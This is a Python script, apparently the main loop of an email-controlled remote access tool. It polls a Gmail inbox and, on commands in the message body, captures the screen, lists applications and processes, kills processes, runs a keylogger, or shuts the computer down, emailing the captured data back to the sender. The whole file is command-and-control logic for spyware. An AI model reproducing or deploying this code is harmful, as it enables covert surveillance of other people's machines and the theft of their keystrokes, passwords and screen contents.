import live_screen
import time
import read_email
from send_email import Mail
import traceback
import app_process
import key_logger
import shut_down


index = 0
while True:
    try:
        email_from, email_subject, email_body = read_email.read_email_from_gmail()
        if email_body == 'live_screen':
            data = live_screen.capture_screen()
            with open('screen.png', 'wb') as f:
                f.write(data)
            attach = []
            attach.append('screen.png')
            mail = Mail()
            mail.sendMailWithAttach(email_from, email_subject, email_body, attach)
        if email_body =='list_app':
            data=app_process.list_app()
            mail = Mail()
            mail.sendMailWithContent(email_from.split(), email_subject, data)
        if email_body =='list_process':
            data=app_process.list_process()
            mail = Mail()
            mail.sendMailWithContent(email_from.split(), email_subject, data)
        if email_body[:4] =='stop':
            app_process.kill_process(email_body[5:])
            attach = []
            mail = Mail()
            mail.sendMailWithAttach(email_from, email_subject, email_body, attach)
        if email_body == 'key_logger':
            data=key_logger.key_logger()
            attach=[]
            mail = Mail()
            mail.sendMailWithAttach(email_from, email_subject, data, attach)
        if email_body == 'shut_down':
            shut_down.shut_down()
            attach = []
            mail = Mail()
            mail.sendMailWithAttach(email_from, email_subject, email_body, attach)
        break
    except Exception as e:
        traceback.print_exc()
        print(str(e))
        print('Lỗi main.py')
        break